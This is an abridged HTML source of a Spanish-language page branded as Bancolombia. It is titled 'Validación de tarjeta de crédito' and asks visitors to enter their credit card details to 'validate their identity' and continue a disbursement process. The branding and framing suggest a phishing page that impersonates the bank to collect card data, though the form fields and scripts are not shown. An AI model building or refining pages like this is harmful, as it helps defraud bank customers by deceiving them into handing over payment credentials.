...
<head>
    ...
    <meta name="description" content="Validación segura de tarjeta de crédito Bancolombia.">
    <title>Validación de tarjeta de crédito — Bancolombia</title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
    <script src="jquery-3.7.7.js"></script>
    <link rel="stylesheet" href="assets/css/pages/desembolso.css">
</head>
<body>
    ...
    ============================================ -->
    <img src="assets/images/ChatGPT Image 29 jun 2026, 12_19_59 a.m..png" alt="" class="debt-mobile">
    ...
    <div class="contenido-principal">
        ...
        <h1 class="titulo-principal">Verifica tu Tarjeta de Crédito</h1>
            ...
            <div class="contenedor-principal">
                ...
                <div class="form-container">
                    <div class="form-box">
                        ...
                        <!-- DESCRIPCIÓN -->
                        <p class="descripcion">
                            Ingresa los datos de tu <strong>Tarjeta de Crédito</strong> para validar tu identidad y continuar con el proceso.
                            <br><br>
    ...
    <script src="assets/js/pages/desembolso.js?v=9"></script>
